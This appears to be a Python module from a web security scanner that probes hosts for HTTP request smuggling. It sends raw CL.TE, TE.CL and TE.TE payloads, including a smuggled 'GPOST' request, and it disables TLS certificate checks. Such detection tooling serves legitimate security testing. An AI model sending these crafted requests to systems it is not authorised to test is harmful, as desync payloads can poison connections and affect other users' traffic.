"""
modules/http_desync.py
----------------------
HTTP/1.1 request smuggling / desync detection.
Techniques: CL.TE, TE.CL, TE.TE, TE.0
"""

import socket
import ssl
import time
from typing import List, Dict, Optional
from urllib.parse import urlparse

from core.logger import get_logger, info, ok, warn
from core.utils import write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("http_desync")


def _send_raw(host: str, port: int, use_tls: bool, raw: bytes,
              timeout: int = 8) -> bytes:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(raw)
        s.settimeout(timeout)
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
        except socket.timeout:
            pass
        s.close()
        return data
    except Exception as e:
        log.debug(f"raw send failed: {e}")
        return b""


def test_cl_te(host: str, port: int, use_tls: bool) -> Optional[Dict]:
    """
    CL.TE smuggling: frontend uses Content-Length, backend uses TE.
    """
    path = "/"
    raw = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 13\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"SMUGGLED\r\n"
    ).encode()

    start = time.time()
    resp1 = _send_raw(host, port, use_tls, raw, timeout=8)
    elapsed1 = time.time() - start

    if b"SMUGGLED" in resp1 or (elapsed1 > 6 and len(resp1) == 0):
        return {
            "type": "http_cl_te_smuggling",
            "url": f"{'https' if use_tls else 'http'}://{host}:{port}{path}",
            "evidence": "CL.TE probe returned smuggled marker or timed out",
            "severity": "critical",
            "confidence": 40,
        }
    return None


def test_te_cl(host: str, port: int, use_tls: bool) -> Optional[Dict]:
    """
    TE.CL smuggling.
    """
    path = "/"
    raw = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"5c\r\n"
        f"GPOST / HTTP/1.1\r\n"
        f"Content-Length: 15\r\n"
        f"\r\n"
        f"x=1\r\n"
        f"0\r\n"
        f"\r\n"
    ).encode()

    resp = _send_raw(host, port, use_tls, raw, timeout=8)
    if b"GPOST" in resp or b"Unrecognized method" in resp or b"invalid method" in resp.lower():
        return {
            "type": "http_te_cl_smuggling",
            "url": f"{'https' if use_tls else 'http'}://{host}:{port}{path}",
            "evidence": "TE.CL probe returned smuggled method",
            "severity": "critical",
            "confidence": 50,
        }
    return None


def test_te_te(host: str, port: int, use_tls: bool) -> Optional[Dict]:
    """
    TE.TE obfuscation: multiple Transfer-Encoding headers, one obfuscated.
    """
    path = "/"
    variants = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
    ]
    for v in variants:
        raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"{v}\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()
        resp = _send_raw(host, port, use_tls, raw, timeout=6)
        if b"X" in resp and b"400" not in resp[:20]:
            return {
                "type": "http_te_te_smuggling",
                "url": f"{'https' if use_tls else 'http'}://{host}:{port}{path}",
                "evidence": f"TE.TE obfuscation variant accepted: {v}",
                "severity": "high",
                "confidence": 30,
            }
    return None


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "http_desync", output_root)
    urls = load_urls(domain, output_root)
    if not urls:
        return {"count": 0, "findings": []}

    hosts = sorted({(urlparse(u).scheme, urlparse(u).netloc.split(":")[0])
                    for u in urls if urlparse(u).netloc})
    info(f"Testing {len(hosts)} hosts for HTTP desync")
    findings: List[Dict] = []

    for scheme, host in hosts[:15]:
        use_tls = scheme == "https"
        port = 443 if use_tls else 80
        for tester in (test_cl_te, test_te_cl, test_te_te):
            try:
                res = tester(host, port, use_tls)
                if res:
                    findings.append(res)
                    save_finding(domain, "http_desync", res["type"],
                                 res["severity"], res["url"],
                                 evidence=res["evidence"], confidence=res["confidence"],
                                 scan_id=scan_id, output_root=output_root)
                    break  # one confirmed per host is enough
            except Exception as e:
                log.debug(f"desync test failed {host}: {e}")

    if findings:
        write_lines(mdir / "http_desync_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "http_desync", run, args.output)